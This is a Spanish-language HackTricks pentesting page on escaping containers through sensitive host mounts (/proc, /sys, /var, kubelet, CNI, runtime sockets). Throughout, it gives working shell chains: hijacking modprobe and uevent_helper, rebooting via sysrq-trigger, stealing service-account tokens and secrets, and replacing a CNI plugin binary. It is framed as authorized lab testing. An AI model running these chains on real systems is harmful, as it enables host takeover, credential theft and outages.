# Montajes sensibles del host

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los montajes del host son una de las superficies prácticas más importantes para realizar un container escape, porque a menudo deshacen el aislamiento cuidadosamente configurado de la vista de procesos y vuelven a proporcionar visibilidad directa sobre los recursos del host. Los casos peligrosos no se limitan a `/`. Los bind mounts de `/proc`, `/sys`, `/var`, los runtime sockets, el estado gestionado por kubelet o las rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, filesystems de contenedores vecinos e interfaces de gestión del runtime.

Esta página existe separadamente de las páginas individuales de protección porque el modelo de abuso es transversal. Un host mount con permisos de escritura es peligroso en parte debido a los mount namespaces, en parte debido a los user namespaces, en parte debido a la cobertura de AppArmor o SELinux y en parte debido a la ruta exacta del host que se expuso. Tratarlo como un tema independiente facilita mucho el análisis de la superficie de ataque.

## Exposición de `/proc`

procfs contiene tanto información común de los procesos como interfaces de control del kernel de gran impacto. Por ello, un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas de proc inesperadamente escribibles puede provocar divulgación de información, denegación de servicio o ejecución directa de código en el host.

Las rutas de procfs de mayor valor incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (especialmente `register` y `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Empieza comprobando qué entradas de procfs de alto valor son visibles o escribibles:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Estas rutas son interesantes por diferentes motivos. `core_pattern`, `modprobe` y `binfmt_misc` pueden convertirse en rutas de ejecución de código en el host cuando son escribibles. `kallsyms`, `kmsg`, `kcore` y `config.gz` son fuentes potentes de reconocimiento para la explotación del kernel. `sched_debug` y `mountinfo` revelan el contexto de procesos, cgroups y sistemas de archivos, lo que puede ayudar a reconstruir el diseño del host desde dentro del contenedor.

El valor práctico de cada ruta es diferente, y tratarlas como si todas tuvieran el mismo impacto dificulta el triage:

- `/proc/sys/kernel/core_pattern`
Si es escribible, esta es una de las rutas procfs de mayor impacto porque el kernel ejecutará un pipe handler después de un crash. Un contenedor que pueda apuntar `core_pattern` a un payload almacenado en su overlay o en una ruta del host montada a menudo puede obtener ejecución de código en el host. Consulta también [read-only-paths.md](protections/read-only-paths.md) para ver un ejemplo específico.
- `/proc/sys/kernel/modprobe`
Esta ruta controla el helper de userspace utilizado por el kernel cuando necesita invocar la lógica de carga de módulos. Si es escribible desde el contenedor y se interpreta en el contexto del host, puede convertirse en otra primitive de ejecución de código en el host. Es especialmente interesante cuando se combina con una forma de activar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente no es una primitive de escape limpia, pero puede convertir la presión de memoria en una denegación de servicio en todo el host al transformar las condiciones OOM en un comportamiento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor magic elegido y obtener ejecución en el contexto del host cuando se ejecute un archivo coincidente.
- `/proc/config.gz`
Útil para el triage de exploits del kernel. Ayuda a determinar qué subsistemas, mitigaciones y funcionalidades opcionales del kernel están habilitados sin necesitar los metadatos de paquetes del host.
- `/proc/sysrq-trigger`
Principalmente es una ruta de denegación de servicio, pero muy grave. Puede reiniciar, provocar un panic o interrumpir de otro modo el host inmediatamente.
- `/proc/kmsg`
Revela mensajes del ring buffer del kernel. Es útil para fingerprinting del host, análisis de crashes y, en algunos entornos, para hacer leak de información útil para la explotación del kernel.
- `/proc/kallsyms`
Es valioso cuando se puede leer porque expone información sobre los símbolos exportados del kernel y puede ayudar a superar las suposiciones de randomización de direcciones durante el desarrollo de exploits del kernel.
- `/proc/[pid]/mem`
Esta es una interfaz directa a la memoria de procesos. Si se puede alcanzar el proceso objetivo con las condiciones necesarias similares a ptrace, puede permitir leer o modificar la memoria de otro proceso. El impacto real depende en gran medida de las credenciales, `hidepid`, Yama y las restricciones de ptrace, por lo que es una ruta potente, pero condicionada.
- `/proc/kcore`
Expone una vista de la memoria del sistema similar a una imagen core. El archivo es enorme y complicado de utilizar, pero si se puede leer de forma significativa indica que la superficie de memoria del host está gravemente expuesta.
- `/dev/kmem` y `/dev/mem`
Estas son interfaces históricas de **dispositivo** de memoria raw de alto impacto, no archivos procfs. En muchos sistemas modernos están ausentes o fuertemente restringidas, pero un contenedor que pueda abrir una copia montada desde el host debe tratar esta exposición como crítica. Revísalas junto con otros mounts sensibles de `/dev` en lugar de buscar las rutas inexistentes `/proc/kmem` o `/proc/mem`.
- `/proc/sched_debug`
Hace leak de información de scheduling y de tareas que puede exponer las identidades de procesos del host incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
Es extremadamente útil para reconstruir dónde se encuentra realmente el contenedor en el host, qué rutas están respaldadas por overlay y si un mount escribible corresponde a contenido del host o únicamente a la capa del contenedor.

Si se puede leer `/proc/[pid]/mountinfo` o los detalles del overlay, utilízalos para recuperar la ruta del host del sistema de archivos del contenedor:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varias técnicas de ejecución en el host requieren convertir una ruta dentro del contenedor en la ruta correspondiente desde la perspectiva del host.

### Ejemplo: Preparar una ruta auxiliar de `modprobe`

Si `/proc/sys/kernel/modprobe` se puede escribir desde el contenedor y la ruta auxiliar se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante. El directorio superior de overlay debe resolverse desde el host, y el resultado de prueba debe escribirse de nuevo en esa misma capa del contenedor visible desde el host si el contenedor tampoco monta el `/tmp` del host:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
El activador exacto depende del objetivo y del comportamiento del kernel, y deliberadamente no se presupone. Restaura el valor original antes de abandonar el laboratorio. El punto importante es que una ruta de helper con permisos de escritura puede redirigir una futura invocación del helper del kernel hacia contenido de una ruta del host controlado por el atacante. Un `upperdir` de overlay inexistente, una ruta que el host no pueda resolver, un montaje de sysctl de solo lectura o un kernel que nunca invoque el helper seleccionado interrumpen esta cadena.

### Ejemplo completo: reconocimiento del kernel con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar la exploitabilidad en lugar de realizar un escape inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a determinar si la información útil de símbolos es visible, si los mensajes recientes del kernel revelan un estado interesante y qué funciones o mitigations del kernel están compiladas. El impacto normalmente no consiste en un escape directo, pero puede acortar considerablemente el triage de vulnerabilidades del kernel.

### Ejemplo completo: reinicio del host mediante SysRq

Si `/proc/sysrq-trigger` es escribible y alcanza la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es un reinicio inmediato del host. Este no es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que una divulgación de información.

## Exposición de `/sys`

sysfs expone grandes cantidades de información sobre el estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar a la ejecución de helpers, el comportamiento de los dispositivos, la configuración de los módulos de seguridad o el estado del firmware.

Las rutas de sysfs de alto valor incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas son importantes por distintos motivos. `/sys/class/thermal` puede influir en el comportamiento de la gestión térmica y, por tanto, en la estabilidad del host en entornos con una exposición deficiente. `/sys/kernel/vmcoreinfo` puede filtrar información sobre los crash dumps y la disposición del kernel, lo que ayuda con el fingerprinting del host a bajo nivel. `/sys/kernel/security` es la interfaz `securityfs` utilizada por los Linux Security Modules, por lo que un acceso inesperado puede exponer o alterar el estado relacionado con MAC. Las rutas de variables EFI pueden afectar a la configuración de arranque respaldada por el firmware, lo que las hace mucho más graves que los archivos de configuración normales. `debugfs`, ubicado en `/sys/kernel/debug`, es especialmente peligroso porque es una interfaz orientada deliberadamente a desarrolladores, con muchas menos expectativas de seguridad que las APIs del kernel destinadas a producción.

Cada entrada de sysfs de esta lista depende del **kernel, la configuración y el hardware**. Los nodos virtualizados actuales suelen omitir por completo `uevent_helper`, las variables EFI y las entradas de dispositivos térmicos. Registra una ruta ausente como un prerrequisito negativo en lugar de asumir que se aplica un ejemplo de otro kernel.

Los comandos de revisión útiles para estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Qué hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otra superficie LSM es visible de una forma que debería haber permanecido solo en el host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y se puede leer o escribir en él, espera una amplia superficie orientada al kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- La exposición de variables EFI es menos común, pero tiene un alto impacto porque afecta a configuraciones respaldadas por el firmware en lugar de a archivos normales del tiempo de ejecución.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host y la interacción con el hardware, no para un escape limpio al estilo de un shell.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente de fingerprinting del host y de análisis de fallos, útil para comprender el estado del kernel a bajo nivel.

### Ejemplo completo: `uevent_helper`

`/sys/kernel/uevent_helper` depende del kernel y de la configuración, y está ausente en muchos sistemas actuales. Si existe, se puede escribir en él y hay un trigger `uevent` utilizable, el kernel puede ejecutar un helper controlado por el atacante. La salida de prueba debe usar una ruta visible tanto desde la vista del host como desde la del contenedor:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de hacerlo dentro del contenedor actual. `/sys/class/mem/null/uevent` es un trigger concreto en los kernels que lo exponen; otros dispositivos pueden exponer sus propios archivos `uevent`, pero no selecciones uno a ciegas en hardware real. Restaura el valor original antes de salir del laboratorio. No informes de esta técnica como disponible cuando falte el archivo del helper o un trigger controlado.

## Exposición de `/var`

Montar el `/var` del host en un contenedor suele subestimarse porque no parece tan dramático como montar `/`. En la práctica, puede bastar para alcanzar sockets de runtime, directorios de snapshots de contenedores, volúmenes de pods gestionados por kubelet, tokens de service-account proyectados y sistemas de archivos de aplicaciones vecinas. En los nodos modernos, `/var` suele ser donde realmente reside el estado de contenedores más interesante desde el punto de vista operativo.

### Ejemplo de Kubernetes

Un pod con `hostPath: /var` a menudo puede leer los tokens proyectados de otros pods y el contenido de snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque indican si el mount solo expone datos de aplicación poco relevantes o credenciales de alto impacto del cluster. Un service-account token legible puede convertir inmediatamente la ejecución local de code en acceso a la Kubernetes API.

Si el token está presente, valida a qué puede acceder en lugar de detenerte al descubrir el token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso al nodo local. Un token con un RBAC amplio puede convertir un `/var` montado en un compromiso de todo el clúster.

### Ejemplo de Docker y containerd

En los hosts de Docker, los datos relevantes suelen encontrarse en `/var/lib/docker`, mientras que en los nodos de Kubernetes respaldados por containerd pueden estar en `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone el contenido escribible de un snapshot de otra carga de trabajo, el atacante podría alterar archivos de la aplicación, plantar contenido web o cambiar scripts de inicio sin modificar la configuración del contenedor actual.

En una **carga de trabajo de laboratorio desechable**, el contenido escribible del snapshot puede demostrar la manipulación de aplicaciones, la recuperación de secretos o el movimiento lateral. Primero, relaciona el ID del contenedor en ejecución con el snapshot exacto y nunca edites un snapshot no relacionado o de producción:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres familias principales de impacto de un `/var` montado: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia workloads vecinos.

Las escrituras directas de snapshots evitan la gestión de estado normal del runtime y pueden corromper el contenedor o destruir evidencia. La discovery de solo lectura se reprodujo localmente contra Docker `overlay2`: un marcador escrito en un contenedor desechable vecino apareció debajo de `/var/lib/docker/overlay2/<id>/diff/`. Limita la modificación real de snapshots a un contenedor desechable creado para esa prueba.

## Estado de Kubelet, plugins y rutas de CNI

Un montaje de `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` suele exponerse mediante DaemonSets privilegiados, agentes de CNI, plugins de nodo CSI, operadores de GPU y helpers de storage. Es fácil descartar estos montajes como "componentes internos del nodo", pero se encuentran directamente en la ruta de ejecución de los nuevos pods y a menudo contienen credenciales de kubelet, secretos proyectados, sockets de registro y binarios ejecutables de plugins del host.

Los objetivos de alto valor incluyen:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Los comandos de revisión útiles son:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por qué importan estas rutas:

- `/var/lib/kubelet/pki` puede exponer certificados de cliente de kubelet y otras credenciales locales del nodo que, en ocasiones, pueden reutilizarse contra el servidor de API o los endpoints TLS orientados a kubelet, según el diseño del clúster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` suele contener tokens de service-account proyectados y Secrets montados para otros pods del mismo nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` es principalmente una superficie de reconnaissance, pero muy útil: revela qué pods y containers poseen actualmente GPUs, hugepages, dispositivos SR-IOV y otros recursos escasos locales del nodo.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` y `/var/lib/kubelet/plugins_registry` revelan qué plugins de CSI, DRA y dispositivos están instalados y con qué sockets se espera que se comunique kubelet. Si esos directorios permiten escritura en lugar de ser únicamente legibles, el hallazgo se vuelve mucho más grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` y `/etc/cni/net.d` se encuentran directamente en la ruta de configuración de la red de los pods. El acceso con permisos de escritura suele ser una primitive de ejecución diferida en el host, más que una simple exposición de configuración.<sup>[[2]](#references)</sup>

### Ejemplo completo: `/opt/cni/bin` escribible

Si un directorio de binarios CNI del host está montado con permisos de lectura y escritura, reemplazar un plugin puede ser suficiente para obtener ejecución en el host la próxima vez que kubelet cree un pod sandbox en ese nodo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Esto no es tan inmediato como un `docker.sock` montado, pero suele ser más realista en infrastructure pods de Kubernetes comprometidos. El marcador se escribe junto al plugin montado para que el contenedor pueda recuperarlo incluso sin un montaje de host-root o de host-`/tmp`. El wrapper conserva los argumentos originales y la entrada estándar; después, el ejemplo restaura el binario original. El punto importante es que el binario modificado será ejecutado posteriormente por el flujo de configuración de red del host, no por el contenedor actual. Usa únicamente un nodo desechable, porque un wrapper inválido puede impedir que los nuevos Pod sandboxes reciban conectividad de red.

## Runtime Sockets

Los montajes sensibles del host suelen incluir Runtime Sockets en lugar de directorios completos. Son tan importantes que merecen repetirse explícitamente aquí:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para conocer los flujos completos de explotación una vez montado uno de estos sockets.

Como patrón rápido para la primera interacción:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, el camino desde un "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corto que cualquier kernel breakout path.

## Writable Host Path Task Hijack

Un writable host mount no necesita exponer `/` para ser peligroso. Si la ruta montada contiene scripts, archivos de configuración, hooks, plugins o archivos que posteriormente consume una scheduled task o un servicio del host, el container puede tener la capacidad de cambiar lo que ejecuta el host.

Flujo de revisión genérico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Si un archivo con permisos de escritura es consumido por un proceso del host, mantén el payload simple y observable durante las pruebas:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La parte interesante es el límite de confianza: la escritura se realiza desde dentro del contenedor, pero la ejecución ocurre posteriormente en el contexto del servicio del host. Esto convierte un hostPath o bind mount limitado en una primitiva de ejecución de código en el host diferida.

## CVE relacionados con los mounts

Los mounts del host también se relacionan con vulnerabilidades del runtime. Entre los ejemplos recientes importantes se incluyen:

- `CVE-2024-21626` en `runc`, donde un descriptor de archivo de directorio filtrado podía ubicar el directorio de trabajo en el sistema de archivos del host.
- `CVE-2024-23651`, `CVE-2024-23652` y `CVE-2024-23653` en BuildKit, donde Dockerfiles, frontends y flujos `RUN --mount` maliciosos podían reintroducir el acceso a archivos del host, su eliminación o privilegios elevados durante las builds.
- `CVE-2024-1753` en los flujos de build de Buildah y Podman, donde bind mounts manipulados durante la build podían exponer `/` con permisos de lectura y escritura.
- `CVE-2025-47290` en `containerd` 2.1.0, donde una condición TOCTOU durante la descompresión de una imagen podía permitir que una imagen especialmente manipulada modificara el sistema de archivos del host durante el pull.

Estos CVE son importantes aquí porque demuestran que el manejo de mounts no depende únicamente de la configuración del operador. El propio runtime también puede introducir condiciones de escape impulsadas por mounts.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de mounts de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Qué es interesante aquí:

- La raíz del host, `/proc`, `/sys`, `/var` y los sockets de runtime son hallazgos de alta prioridad.
- Las entradas de proc/sys con permisos de escritura suelen indicar que el mount expone controles globales del kernel del host en lugar de una vista segura del contenedor.
- Las rutas `/var` montadas requieren revisar credenciales y workloads vecinos, no solo el sistema de archivos.
- Los directorios de estado de Kubelet y las rutas de CNI/plugins merecen la misma prioridad que los sockets de runtime, porque a menudo se encuentran directamente en la ruta de creación de pods y distribución de credenciales del nodo.

## Estado de validación local

Las cadenas prácticas de esta página se comprobaron en un nodo Linux minikube local. La validación reprodujo:

- acceso de lectura y escritura mediante un `hostPath` temporal con permisos de escritura
- descubrimiento de tokens de ServiceAccount proyectados y Secrets montados a través de `/var/lib/kubelet/pods`
- autenticación exitosa en la API de Kubernetes con un token activo recuperado de ese estado montado de kubelet
- descubrimiento de solo lectura de un sistema de archivos `overlay2` de Docker perteneciente a un workload vecino mediante `/var` montado
- creación, mediante la API de Docker, de un contenedor hermano con un bind del host de solo lectura a través de un `docker.sock` montado
- ejecución retardada en el host mediante un hook temporal consumido por el host
- una simulación de wrapper de CNI que conservó los argumentos, la entrada estándar y la ejecución del plugin original

El mismo nodo expuso `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` y `config.gz`, pero no expuso `uevent_helper`, variables EFI, entradas térmicas ni `sched_debug`. No se ejecutaron triggers destructivos del kernel. Esto confirma que las cadenas relacionadas con la raíz del host, `/var`, el estado de kubelet, los sockets y los consumidores del host son reproducibles, mientras que las técnicas auxiliares de procfs/sysfs deben seguir siendo condicionales al kernel exacto, el modo de mount, la ruta del payload y el trigger.

## References

- [1] [Archivos y rutas locales utilizados por Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [El contenedor `cilium-agent` puede acceder al host mediante un mount de `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
